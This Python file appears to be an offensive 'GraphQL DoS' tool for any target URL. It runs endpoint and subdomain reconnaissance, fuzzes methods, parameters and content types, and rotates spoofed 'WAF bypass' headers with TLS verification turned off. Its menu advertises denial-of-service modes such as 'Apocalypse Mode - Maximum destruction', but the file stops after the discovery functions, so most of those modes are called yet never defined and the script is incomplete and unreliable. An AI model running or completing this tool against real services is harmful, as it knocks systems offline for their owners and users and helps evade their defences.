# graphql_dos_assault_tool.py - Universal GraphQL DoS Assessment Tool
import requests
import json
import time
import sys
import threading
import concurrent.futures
import random
import string
from urllib.parse import urlparse, urljoin
import ssl
import socket
import statistics
import hashlib
import hmac
import base64
import urllib.parse
import mimetypes
import os
from datetime import datetime
import logging
import ipaddress
import subprocess
import select

class GraphQLDoSAssault:
    def __init__(self):
        self.base_target = ""
        self.target_url = ""
        self.session = requests.Session()
        
        # Professional headers with rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'PostmanRuntime/7.36.3',
            'curl/8.4.0',
            'python-requests/2.31.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
        self.session.headers.update({
            'Accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br, identity',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        
        self.attack_results = []
        self.active_attacks = 0
        self.max_concurrent = 500
        self.stop_signal = False
        self.success_count = 0
        self.fail_count = 0
        self.timeout_count = 0
        self.rate_limit_count = 0
        self.working_endpoints = []
        self.performance_metrics = {
            'baseline': [],
            'under_attack': [],
            'recovery': []
        }
        
        # WAF bypass headers
        self.waf_bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Original-URL': '/'},
            {'X-Rewrite-URL': '/'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Original-Host': 'localhost'},
            {'X-Host': 'localhost'},
            {'X-HTTP-Method-Override': 'POST'},
            {'X-Method-Override': 'POST'},
            {'X-HTTP-Method': 'POST'},
            {'X-Nginx-Cache': 'BYPASS'},
            {'X-Api-Version': '1.0'},
            {'X-Api-Key': 'test'},
            {'X-Access-Token': 'test'},
            {'X-CSRF-Token': 'test'},
            {'X-Requested-With': 'XMLHttpRequest'},
            {'X-Request-ID': str(random.randint(1000000, 9999999))},
            {'X-Correlation-ID': str(random.randint(1000000, 9999999))},
            {'X-Trace-ID': str(random.randint(1000000, 9999999))},
            {'X-Amzn-Trace-Id': f"Root=1-{random.randint(10000000, 99999999)}-{random.randint(10000000, 99999999)}"},
            {'X-Cloud-Trace-Context': f"{random.randint(1000000000000000000, 9999999999999999999)}/0;o=1"},
            {'X-Edge-Location': 'mia'},
            {'X-Edge-Request-ID': str(random.randint(1000000000000000, 9999999999999999))},
            {'X-Akamai-Request-ID': str(random.randint(1000000000000000, 9999999999999999))},
            {'X-Fastly-Request-ID': str(random.randint(1000000000000000, 9999999999999999))},
            {'X-Cache-Status': 'MISS'},
            {'X-Cacheable': 'YES'},
            {'X-Varnish': str(random.randint(1000000000, 9999999999))},
            {'X-Served-By': 'cache-mia12345-MIA'},
            {'X-Timer': f'S{int(time.time())}.{random.randint(100000, 999999)},VS0,VE0'},
            {'X-Generator': 'API'},
            {'X-Powered-By': 'Express'},
            {'X-DNS-Prefetch-Control': 'off'},
            {'X-Download-Options': 'noopen'},
            {'X-Content-Type-Options': 'nosniff'},
            {'X-Permitted-Cross-Domain-Policies': 'none'},
            {'X-Frame-Options': 'DENY'},
            {'Referrer-Policy': 'no-referrer'},
            {'Feature-Policy': "geolocation 'none'; microphone 'none'; camera 'none'"},
            {'Origin': 'https://localhost'},
            {'Referer': 'https://localhost/'},
            {'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'},
            {'Sec-Ch-Ua-Mobile': '?0'},
            {'Sec-Ch-Ua-Platform': '"Windows"'},
            {'Sec-GPC': '1'},
        ]
        
        # Content types to try
        self.content_types = [
            'application/json',
            'application/graphql',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'application/x-ndjson',
            'application/xml',
            'text/xml',
            'application/x-protobuf',
            'application/msgpack',
            'application/cbor',
            'application/bson',
            'application/vnd.api+json',
            'application/vnd.graphql+json',
            'application/vnd.graphql',
        ]
        
        # HTTP methods to try
        self.http_methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        
        # Endpoint patterns
        self.endpoint_patterns = [
            "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
            "/query", "/gql", "/graphql/v1", "/graphql/v2", "/graphql/v3",
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/graphql-api", "/api/graphql-api", "/graphql/query", "/graphql/console",
            "/graphql/explorer", "/playground", "/altair", "/graphiql", "/voyager",
            "/sandbox", "/studio", "/dev", "/development", "/staging", "/production",
            "/internal", "/private", "/secure", "/admin", "/admin/api/graphql",
            "/data", "/data/graphql", "/services/graphql", "/gateway/graphql",
            "/backend/graphql", "/frontend/graphql", "/web/graphql", "/app/graphql",
            "/mobile/graphql", "/desktop/graphql", "/client/graphql", "/server/graphql",
        ]
        
        # Subdomains to test
        self.subdomains = [
            "api", "graphql", "gql", "query", "data", "service", "services",
            "backend", "frontend", "web", "app", "mobile", "desktop", "client",
            "server", "admin", "secure", "private", "internal", "dev", "staging",
            "production", "v1", "v2", "v3", "v4", "beta", "alpha", "test"
        ]
        
        # Parameter names to try
        self.param_names = [
            "query", "q", "graphql", "gql", "operation", "op", "request", "req",
            "data", "payload", "body", "content", "input", "variables", "vars",
            "operationName", "operation_name", "opname", "extensions", "ext",
            "mutation", "subscription", "fragment", "fragments", "schema", "type",
        ]
        
        # Logging setup
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('graphql_dos.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def start_assault_console(self):
        """Main console interface"""
        print("\n" + "=" * 80)
        print("GRAPHQL DoS ASSESSMENT TOOL v3.0 - 405 ERROR BYPASS EDITION")
        print("=" * 80)
        
        # Interactive target input
        print("\n[1/4] TARGET CONFIGURATION")
        print("-" * 40)
        
        while True:
            target = input("Enter target URL (e.g., https://example.com): ").strip()
            if target:
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                self.base_target = target.rstrip('/')
                
                specific = input(f"Enter specific GraphQL endpoint (or press Enter to auto-discover): ").strip()
                if specific:
                    if not specific.startswith('http'):
                        self.target_url = f"{self.base_target}/{specific.lstrip('/')}"
                    else:
                        self.target_url = specific
                else:
                    self.target_url = f"{self.base_target}/graphql"
                
                print(f"\nTarget configured:")
                print(f"  Base: {self.base_target}")
                print(f"  GraphQL endpoint: {self.target_url}")
                
                confirm = input("\nIs this correct? (y/n): ").strip().lower()
                if confirm == 'y':
                    break
            else:
                print("Please enter a valid target URL.")
        
        print("\n[2/4] ADVANCED RECONNAISSANCE (405 BYPASS)")
        print("-" * 40)
        self.advanced_reconnaissance_phase()
        
        print("\n[3/4] SELECTING ATTACK STRATEGY")
        print("-" * 40)
        
        while True:
            print("\n" + "=" * 80)
            print("ADVANCED ATTACK MODES (405-AWARE)")
            print("=" * 80)
            print("1.  Reconnaissance Only - Find working endpoints")
            print("2.  Method Discovery Attack - Find working HTTP methods")
            print("3.  Header Fuzzing Attack - Bypass WAF with headers")
            print("4.  Parameter Fuzzing Attack - Test different params")
            print("5.  Content-Type Attack - Test different content types")
            print("6.  Subdomain Discovery - Find hidden endpoints")
            print("7.  Lightning Strike - Fast aggressive DoS")
            print("8.  Vortex Attack - Multi-vector saturation")
            print("9.  Apocalypse Mode - Maximum destruction")
            print("10. Precision Strike - Target specific vulnerabilities")
            print("11. Endless Torment - Sustained attack")
            print("12. Impact Assessment - Measure before/after")
            print("13. Advanced 405 Bypass - All bypass techniques")
            print("14. WebSocket Attack - GraphQL over WebSockets")
            print("15. Batch Attack - Multiple queries in one request")
            print("16. Persisted Query Attack - Attack persisted queries")
            print("17. Schema Introspection - Extract schema info")
            print("18. Subscription Attack - WebSocket subscriptions")
            print("19. DNS Rebinding Attack - Bypass origin restrictions")
            print("20. Full Comprehensive Attack - All techniques")
            print("0.  Exit")
            
            choice = input("\nSelect attack mode (0-20): ").strip()
            
            if choice == "0":
                print("Exiting...")
                return
            elif choice == "1":
                self.reconnaissance_only()
            elif choice == "2":
                self.method_discovery_attack()
            elif choice == "3":
                self.header_fuzzing_attack()
            elif choice == "4":
                self.parameter_fuzzing_attack()
            elif choice == "5":
                self.content_type_attack()
            elif choice == "6":
                self.subdomain_discovery_attack()
            elif choice == "7":
                self.lightning_strike()
            elif choice == "8":
                self.vortex_attack()
            elif choice == "9":
                self.apocalypse_mode()
            elif choice == "10":
                self.precision_strike()
            elif choice == "11":
                self.endless_torment()
            elif choice == "12":
                self.impact_assessment()
            elif choice == "13":
                self.advanced_405_bypass()
            elif choice == "14":
                self.websocket_attack()
            elif choice == "15":
                self.batch_attack()
            elif choice == "16":
                self.persisted_query_attack()
            elif choice == "17":
                self.schema_introspection_attack()
            elif choice == "18":
                self.subscription_attack()
            elif choice == "19":
                self.dns_rebinding_attack()
            elif choice == "20":
                self.full_comprehensive_attack()
            else:
                print("Invalid selection!")
                continue
            
            again = input("\nExecute another test? (y/N): ").strip().lower()
            if again != 'y':
                break

    def advanced_reconnaissance_phase(self):
        """Advanced reconnaissance with 405 bypass techniques"""
        print("Performing advanced reconnaissance (bypassing 405 errors)...")
        
        # Test multiple endpoints
        endpoints_to_test = self.generate_test_endpoints()
        
        print(f"Testing {len(endpoints_to_test)} endpoints with multiple methods...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for endpoint in endpoints_to_test:
                for method in self.http_methods[:5]:  # Test first 5 methods
                    for content_type in self.content_types[:3]:  # Test first 3 content types
                        futures.append(executor.submit(
                            self.test_endpoint_comprehensive,
                            endpoint, method, content_type
                        ))
            
            completed = 0
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                if completed % 100 == 0:
                    print(f"  Progress: {completed}/{len(futures)}")
                
                try:
                    result = future.result(timeout=15)
                    if result and result.get('working'):
                        endpoint_info = {
                            'endpoint': result['endpoint'],
                            'method': result['method'],
                            'content_type': result['content_type'],
                            'status': result['status'],
                            'response_time': result['response_time'],
                            'working': True,
                            'is_graphql': result['is_graphql']
                        }
                        
                        # Add if not already in list
                        if not any(e['endpoint'] == endpoint_info['endpoint'] and 
                                  e['method'] == endpoint_info['method'] for e in self.working_endpoints):
                            self.working_endpoints.append(endpoint_info)
                            print(f"  ✓ Found: {endpoint_info['endpoint']} ({endpoint_info['method']})")
                            
                except Exception as e:
                    continue
        
        if not self.working_endpoints:
            print("No working endpoints found with basic methods. Trying advanced techniques...")
            self.aggressive_endpoint_discovery()
        else:
            print(f"\nFound {len(self.working_endpoints)} working endpoint(s)")
            
            # Sort by response time
            self.working_endpoints.sort(key=lambda x: x.get('response_time', 100))
            
            # Show top 10
            print("\nTop 10 fastest endpoints:")
            for i, endpoint in enumerate(self.working_endpoints[:10], 1):
                print(f"  {i}. {endpoint['endpoint']} ({endpoint['method']}) - {endpoint.get('response_time', 0):.2f}s")

    def generate_test_endpoints(self):
        """Generate test endpoints"""
        endpoints = []
        
        # Add the provided endpoint
        endpoints.append(self.target_url)
        
        # Add common paths
        for path in self.endpoint_patterns[:20]:
            endpoints.append(f"{self.base_target}{path}")
        
        # Try subdomains
        domain_parts = urlparse(self.base_target)
        base_domain = domain_parts.netloc
        
        # Extract root domain (remove www.)
        if base_domain.startswith('www.'):
            root_domain = base_domain[4:]
        else:
            root_domain = base_domain
        
        for subdomain in self.subdomains[:10]:
            endpoints.append(f"{domain_parts.scheme}://{subdomain}.{root_domain}/graphql")
            endpoints.append(f"{domain_parts.scheme}://{subdomain}.{root_domain}/api/graphql")
        
        # Try different ports
        ports = [443, 80, 8080, 8443, 3000, 4000, 5000, 8000, 9000]
        for port in ports:
            if ':' not in base_domain:  # Only add if no port already
                endpoints.append(f"{domain_parts.scheme}://{base_domain}:{port}/graphql")
        
        return list(set(endpoints))  # Remove duplicates

    def test_endpoint_comprehensive(self, endpoint, method, content_type):
        """Comprehensive endpoint testing"""
        try:
            headers = self.get_headers_for_test(method, content_type)
            
            # Prepare payload based on content type
            payload = self.get_payload_for_content_type(content_type)
            
            start_time = time.time()
            
            if method == 'GET':
                # For GET, add query as parameter
                parsed = urlparse(endpoint)
                query_string = f"?{payload}" if '?' not in endpoint else f"&{payload.split('?')[-1]}"
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}{query_string}"
                response = self.session.get(test_url, timeout=10, headers=headers, verify=False)
            else:
                if content_type == 'multipart/form-data':
                    # Handle multipart
                    files = {'file': ('query.graphql', payload, 'application/graphql')}
                    response = self.session.request(method, endpoint, files=files, timeout=10, headers=headers, verify=False)
                else:
                    response = self.session.request(method, endpoint, data=payload, timeout=10, headers=headers, verify=False)
            
            response_time = time.time() - start_time
            
            # Check if GraphQL response
            is_graphql = self.is_graphql_response(response)
            
            working = (response.status_code == 200 and is_graphql)
            
            return {
                'endpoint': endpoint,
                'method': method,
                'content_type': content_type,
                'status': response.status_code,
                'response_time': response_time,
                'working': working,
                'is_graphql': is_graphql
            }
            
        except Exception as e:
            return None

    def get_headers_for_test(self, method, content_type):
        """Get headers for testing"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }
        
        if content_type and content_type != 'multipart/form-data':
            headers['Content-Type'] = content_type
        
        # Add random WAF bypass headers
        if random.random() > 0.5:
            bypass = random.choice(self.waf_bypass_headers)
            headers.update(bypass)
        
        # Add Origin/Referer if not present
        if 'Origin' not in headers:
            headers['Origin'] = self.base_target
        if 'Referer' not in headers:
            headers['Referer'] = f"{self.base_target}/"
        
        return headers

    def get_payload_for_content_type(self, content_type):
        """Get appropriate payload for content type"""
        simple_query = '{__typename}'
        
        if content_type == 'application/json':
            return json.dumps({"query": simple_query})
        elif content_type == 'application/graphql':
            return simple_query
        elif content_type == 'application/x-www-form-urlencoded':
            return f"query={urllib.parse.quote(simple_query)}"
        elif content_type == 'text/plain':
            return simple_query
        elif content_type == 'application/xml':
            return f'<?xml version="1.0"?><query>{simple_query}</query>'
        else:
            return json.dumps({"query": simple_query})

    def is_graphql_response(self, response):
        """Check if response looks like GraphQL"""
        if not response.text:
            return False
        
        try:
            data = json.loads(response.text)
            
            # GraphQL responses have data or errors field
            if 'data' in data or 'errors' in data:
                return True
            
            # Check for GraphQL error patterns
            if isinstance(data, dict):
                for key in data.keys():
                    if 'graphql' in key.lower() or 'query' in key.lower():
                        return True
                        
        except:
            # Not JSON, check text
            text = response.text.lower()
            graphql_indicators = ['data', 'errors', '__typename', 'graphql', 'query', 'mutation']
            if any(indicator in text for indicator in graphql_indicators):
                return True
        
        return False

    def aggressive_endpoint_discovery(self):
        """More aggressive endpoint discovery"""
        print("\nTrying aggressive discovery techniques...")
        
        # Try different authentication methods
        auth_methods = [
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'},
            {'X-API-Key': 'test-api-key-12345'},
            {'X-Access-Token': 'test-access-token-12345'},
            {'api-key': 'test-key-12345'},
            {'X-Auth-Token': 'test-auth-token-12345'},
        ]
        
        # Try different query formats
        query_formats = [
            # Simple
            '{"query":"{__typename}"}',
            # With operation name
            '{"query":"query GetType { __typename }","operationName":"GetType"}',
            # With variables
            '{"query":"query Test($id: ID!) { __typename }","variables":{"id":"1"}}',
            # Minimal
            '{"q":"{__typename}"}',
            # Array format (batch)
            '[{"query":"{__typename}"}]',
            # Nested
            '{"request":{"query":"{__typename}"}}',
            # String only
            '{__typename}',
        ]
        
        # Test combinations
        test_count = 0
        success_count = 0
        
        for endpoint in [self.target_url, f"{self.base_target}/graphql", f"{self.base_target}/api/graphql"]:
            for auth in auth_methods:
                for query in query_formats[:3]:  # Test first 3
                    test_count += 1
                    
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Content-Type': 'application/json',
                        }
                        headers.update(auth)
                        
                        response = self.session.post(
                            endpoint,
                            data=query,
                            timeout=5,
                            headers=headers,
                            verify=False
                        )
                        
                        if response.status_code == 200 and self.is_graphql_response(response):
                            endpoint_info = {
                                'endpoint': endpoint,
                                'method': 'POST',
                                'content_type': 'application/json',
                                'status': response.status_code,
                                'working': True,
                                'is_graphql': True,
                                'auth_method': list(auth.keys())[0]
                            }
                            
                            if not any(e['endpoint'] == endpoint_info['endpoint'] for e in self.working_endpoints):
                                self.working_endpoints.append(endpoint_info)
                                print(f"  ✓ Found with auth: {endpoint}")
                                success_count += 1
                                break
                                
                    except:
                        continue
            
            if success_count >= 3:  # Stop if we found enough
                break
        
        if success_count == 0:
            print("  No endpoints found with aggressive techniques.")
            print("  Trying socket-level connection...")
            self.test_socket_connection()
        else:
            print(f"\nFound {success_count} endpoint(s) with aggressive techniques")

    def test_socket_connection(self):
        """Test raw socket connection"""
        try:
            parsed = urlparse(self.base_target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            print(f"  Testing raw socket to {hostname}:{port}...")
            
            # Try HTTP first
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                sock.connect((hostname, port))
                
                # Send HTTP request
                request = f"GET /graphql HTTP/1.1\r\n"
                request += f"Host: {hostname}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: close\r\n\r\n"
                
                sock.send(request.encode())
                
                # Receive response
                response = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                    except socket.timeout:
                        break
                
                sock.close()
                
                if b"HTTP/1.1 200" in response or b"HTTP/2 200" in response:
                    print(f"  ✓ Socket connection successful to {hostname}:{port}")
                    
            except Exception as e:
                print(f"  ✗ Socket error: {e}")
                
        except Exception as e:
            print(f"  ✗ Socket test failed: {e}")

    def reconnaissance_only(self):
        """Just reconnaissance"""
        print("\n" + "=" * 80)
        print("RECONNAISSANCE ONLY MODE")
        print("=" * 80)
        
        self.advanced_reconnaissance_phase()
        
        if self.working_endpoints:
            print("\n" + "=" * 80)
            print("RECONNAISSANCE RESULTS")
            print("=" * 80)
            
            for i, endpoint in enumerate(self.working_endpoints, 1):
                print(f"\n{i}. {endpoint['endpoint']}")
                print(f"   Method: {endpoint['method']}")
                print(f"   Content-Type: {endpoint.get('content_type', 'N/A')}")
                print(f"   Status: HTTP {endpoint['status']}")
                print(f"   Response Time: {endpoint.get('response_time', 0):.2f}s")
                print(f"   GraphQL: {'Yes' if endpoint.get('is_graphql', False) else 'No'}")
        
        else:
            print("\nNo working endpoints found.")
        
        print("\n" + "=" * 80)
        print("RECONNAISSANCE COMPLETE")
        print("=" * 80)

    def method_discovery_attack(self):
        """Find working HTTP methods"""
        print("\n" + "=" * 80)
        print("METHOD DISCOVERY ATTACK")
        print("=" * 80)
        
        if not self.working_endpoints:
            print("No endpoints to test. Running reconnaissance...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"\nTesting endpoint: {endpoint}")
        
        working_methods = []
        
        for method in self.http_methods:
            print(f"\n  Testing {method}...")
            
            for content_type in ['application/json', 'application/graphql', 'application/x-www-form-urlencoded']:
                try:
                    headers = self.get_headers_for_test(method, content_type)
                    payload = self.get_payload_for_content_type(content_type)
                    
                    start = time.time()
                    
                    if method == 'GET':
                        parsed = urlparse(endpoint)
                        query_string = f"?{payload}" if '?' not in endpoint else f"&{payload.split('?')[-1]}"
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}{query_string}"
                        response = self.session.get(test_url, timeout=5, headers=headers, verify=False)
                    else:
                        response = self.session.request(method, endpoint, data=payload, timeout=5, headers=headers, verify=False)
                    
                    elapsed = time.time() - start
                    
                    print(f"    {content_type}: HTTP {response.status_code} ({elapsed:.2f}s)")
                    
                    if response.status_code != 405:
                        working_methods.append({
                            'method': method,
                            'content_type': content_type,
                            'status': response.status_code,
                            'time': elapsed
                        })
                        
                        if response.status_code == 200 and self.is_graphql_response(response):
                            print(f"    ✓ {method} with {content_type} WORKS!")
                            
                except Exception as e:
                    print(f"    Error: {str(e)[:50]}")
        
        if working_methods:
            print("\n" + "=" * 80)
            print("WORKING METHODS FOUND:")
            print("=" * 80)
            
            for wm in working_methods:
                print(f"  • {wm['method']} with {wm['content_type']} - HTTP {wm['status']} ({wm['time']:.2f}s)")
        else:
            print("\nNo working methods found. All returned 405.")

    def header_fuzzing_attack(self):
        """Fuzz headers to bypass WAF"""
        print("\n" + "=" * 80)
        print("HEADER FUZZING ATTACK")
        print("=" * 80)
        
        if not self.working_endpoints:
            print("No endpoints to test. Running reconnaissance...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"\nTesting endpoint: {endpoint}")
        
        successful_headers = []
        
        # Test individual headers
        print("\nTesting individual headers...")
        
        for i, header_set in enumerate(self.waf_bypass_headers[:30], 1):
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': 'application/json',
                }
                headers.update(header_set)
                
                print(f"\n  Test {i}: {list(header_set.keys())}")
                
                response = self.session.post(
                    endpoint,
                    json={"query": "{__typename}"},
                    timeout=5,
                    headers=headers,
                    verify=False
                )
                
                print(f"    Status: {response.status_code}")
                
                if response.status_code != 405:
                    successful_headers.append((header_set, response.status_code))
                    
                    if response.status_code == 200:
                        print(f"    ✓ HEADER BYPASS SUCCESSFUL!")
                        print(f"    Headers: {header_set}")
                        
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        # Test header combinations
        if not successful_headers:
            print("\nTesting header combinations...")
            
            for i in range(10):
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Content-Type': 'application/json',
                    }
                    
                    # Add 3-5 random bypass headers
                    num_headers = random.randint(3, 5)
                    for _ in range(num_headers):
                        headers.update(random.choice(self.waf_bypass_headers))
                    
                    print(f"\n  Combination {i+1}: {len(headers)} headers")
                    
                    response = self.session.post(
                        endpoint,
                        json={"query": "{__typename}"},
                        timeout=5,
                        headers=headers,
                        verify=False
                    )
                    
                    print(f"    Status: {response.status_code}")
                    
                    if response.status_code == 200:
                        successful_headers.append((headers, response.status_code))
                        print(f"    ✓ COMBINATION BYPASS SUCCESSFUL!")
                        break
                        
                except Exception as e:
                    print(f"    Error: {str(e)[:50]}")
        
        if successful_headers:
            print("\n" + "=" * 80)
            print("SUCCESSFUL HEADER BYPASSES:")
            print("=" * 80)
            
            for headers, status in successful_headers:
                print(f"\nStatus {status}:")
                for key, value in headers.items():
                    if key not in ['User-Agent', 'Content-Type']:
                        print(f"  {key}: {value}")
        else:
            print("\nNo header bypasses found.")

    def parameter_fuzzing_attack(self):
        """Fuzz parameters"""
        print("\n" + "=" * 80)
        print("PARAMETER FUZZING ATTACK")
        print("=" * 80)
        
        if not self.working_endpoints:
            print("No endpoints to test. Running reconnaissance...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"\nTesting endpoint: {endpoint}")
        
        successful_params = []
        
        # Test different parameter formats
        param_formats = [
            # Standard JSON
            {"query": "{__typename}"},
            
            # With operation name
            {"query": "query Test { __typename }", "operationName": "Test"},
            
            # With variables
            {"query": "query Test($id: ID!) { __typename }", "variables": {"id": "1"}},
            
            # With extensions
            {"query": "{__typename}", "extensions": {}},
            
            # All together
            {"query": "query Test($id: ID!) { __typename }", 
             "operationName": "Test",
             "variables": {"id": "1"},
             "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "test"}}},
            
            # Different parameter names
            {"q": "{__typename}"},
            {"graphql": "{__typename}"},
            {"gql": "{__typename}"},
            {"request": "{__typename}"},
            
            # Nested
            {"data": {"query": "{__typename}"}},
            {"payload": {"query": "{__typename}"}},
            
            # Array format
            [{"query": "{__typename}"}],
            
            # String only
            "{__typename}",
        ]
        
        print("\nTesting parameter formats...")
        
        for i, params in enumerate(param_formats, 1):
            try:
                print(f"\n  Test {i}: {type(params).__name__}")
                
                if isinstance(params, dict):
                    response = self.session.post(
                        endpoint,
                        json=params,
                        timeout=5,
                        headers={'User-Agent': random.choice(self.user_agents)},
                        verify=False
                    )
                elif isinstance(params, list):
                    response = self.session.post(
                        endpoint,
                        json=params,
                        timeout=5,
                        headers={'User-Agent': random.choice(self.user_agents)},
                        verify=False
                    )
                else:  # string
                    response = self.session.post(
                        endpoint,
                        data=params,
                        timeout=5,
                        headers={
                            'User-Agent': random.choice(self.user_agents),
                            'Content-Type': 'text/plain'
                        },
                        verify=False
                    )
                
                print(f"    Status: {response.status_code}")
                
                if response.status_code != 405:
                    successful_params.append((params, response.status_code))
                    
                    if response.status_code == 200:
                        print(f"    ✓ PARAMETER FORMAT ACCEPTED!")
                        
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        if successful_params:
            print("\n" + "=" * 80)
            print("SUCCESSFUL PARAMETER FORMATS:")
            print("=" * 80)
            
            for params, status in successful_params:
                param_type = type(params).__name__
                print(f"\nStatus {status}: {param_type}")
                if isinstance(params, dict):
                    for key in params.keys():
                        print(f"  • {key}")
        else:
            print("\nNo alternative parameter formats accepted.")

    def content_type_attack(self):
        """Test different content types"""
        print("\n" + "=" * 80)
        print("CONTENT-TYPE ATTACK")
        print("=" * 80)
        
        if not self.working_endpoints:
            print("No endpoints to test. Running reconnaissance...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"\nTesting endpoint: {endpoint}")
        
        successful_types = []
        
        for content_type in self.content_types:
            try:
                print(f"\n  Testing {content_type}...")
                
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': content_type,
                }
                
                payload = self.get_payload_for_content_type(content_type)
                
                response = self.session.post(
                    endpoint,
                    data=payload,
                    timeout=5,
                    headers=headers,
                    verify=False
                )
                
                print(f"    Status: {response.status_code}")
                
                if response.status_code != 405:
                    successful_types.append((content_type, response.status_code))
                    
                    if response.status_code == 200:
                        print(f"    ✓ CONTENT-TYPE ACCEPTED!")
                        
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        if successful_types:
            print("\n" + "=" * 80)
            print("SUCCESSFUL CONTENT-TYPES:")
            print("=" * 80)
            
            for content_type, status in successful_types:
                print(f"  • {content_type} - HTTP {status}")
        else:
            print("\nNo alternative content-types accepted.")

    def subdomain_discovery_attack(self):
        """Discover subdomains"""
        print("\n" + "=" * 80)
        print("SUBDOMAIN DISCOVERY ATTACK")
        print("=" * 80)
        
        parsed = urlparse(self.base_target)
        base_domain = parsed.hostname
        
        # Extract root domain
        if base_domain.startswith('www.'):
            root_domain = base_domain[4:]
        else:
            root_domain = base_domain
        
        print(f"\nDiscovering subdomains for {root_domain}...")
        
        found_subdomains = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for subdomain in self.subdomains:
                test_domain = f"{subdomain}.{root_domain}"
                for path in ['/graphql', '/api/graphql', '/graphql/v1']:
                    url = f"{parsed.scheme}://{test_domain}{path}"
                    futures.append(executor.submit(self.test_subdomain, url))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result(timeout=10)
                    if result:
                        found_subdomains.append(result)
                        print(f"  ✓ Found: {result['url']} (HTTP {result['status']})")
                except:
                    continue
        
        if found_subdomains:
            print("\n" + "=" * 80)
            print("SUBDOMAINS FOUND:")
            print("=" * 80)
            
            for subdomain in found_subdomains:
                print(f"\n{subdomain['url']}")
                print(f"  Status: HTTP {subdomain['status']}")
                print(f"  GraphQL: {'Yes' if subdomain.get('graphql', False) else 'No'}")
        else:
            print("\nNo subdomains found.")

    def test_subdomain(self, url):
        """Test a subdomain"""
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            
            response = self.session.get(url, timeout=5, headers=headers, verify=False)
            
            if response.status_code != 404 and response.status_code != 403:
                is_graphql = self.is_graphql_response(response)
                
                return {
                    'url': url,
                    'status': response.status_code,
                    'graphql': is_graphql
                }
                
        except:
            pass
        
        return None

